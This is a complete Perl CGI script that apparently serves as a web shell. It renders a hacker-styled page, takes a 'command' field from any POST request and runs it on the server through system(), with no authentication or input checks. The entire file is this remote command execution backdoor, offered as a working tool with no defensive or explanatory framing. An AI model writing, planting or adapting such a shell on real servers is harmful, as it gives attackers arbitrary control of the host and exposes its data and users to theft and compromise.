#!/usr/bin/perl -w

#Set Header
print "Content-type: text/html\n\n";

#Define Style & Declare Javascripts
print '
<html>
<head>
        <script type="text/javascript"
                src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js">
        </script>
        
        <style type="text/css">
                body{ background:#000; color:#33FF00;
                        font-family:andale mono, lucida console, bitstream vera sans,
                        tahoma; font-size:12px;
                }
        </style>
</head>
';

my $method = $ENV{'REQUEST_METHOD'};

if ($method eq "POST") {
        read(STDIN, $text, $ENV{'CONTENT_LENGTH'});

        my @value_pairs = split (/&/,$text);
        my %form_results = ();
        
        foreach $pair (@value_pairs) {
         ($key, $value) = split (/=/,$pair);
         $value =~ tr/+/ /;
         $value =~ s/%([\dA-Fa-f][\dA-Fa-f])/pack ("C", hex ($1))/eg;
         $form_results{$key} = $value;
         #Use a hash of posted vars for future functionality expansion.
        }
        
        $CMD = $form_results{'command'};

        $execute = system($CMD);
        print $execute;
}
else {
        print "Error!";
}

#End Page
print "</body></html>";
